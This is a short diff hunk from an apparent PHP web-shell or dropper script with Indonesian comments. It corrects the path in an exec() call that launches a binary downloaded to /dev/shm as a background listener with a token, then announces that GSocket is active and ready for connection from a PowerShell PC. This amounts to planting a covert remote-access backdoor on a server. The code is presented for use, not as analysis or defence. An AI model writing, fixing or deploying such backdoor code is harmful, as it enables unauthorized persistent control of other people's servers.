@@ -46,7 +46,7 @@ if (!file_exists($ttmp_path)) {
 if (file_exists($ttmp_path)) {
     echo "Binary siap. Memulai Listener...<br>";
     // Jalankan di background
-    exec("HOME=/dev/shm $tmp_path -s $token -l -i > /dev/null 2>&1 &");
+    exec("HOME=/dev/shm $ttmp_path -s $token -l -i > /dev/null 2>&1 &");
     echo "GSocket AKTIF! Silakan konek dari PowerShell PC.";
 } else {
     echo "Gagal download ke /dev/shm. Coba cek koneksi internet server.";
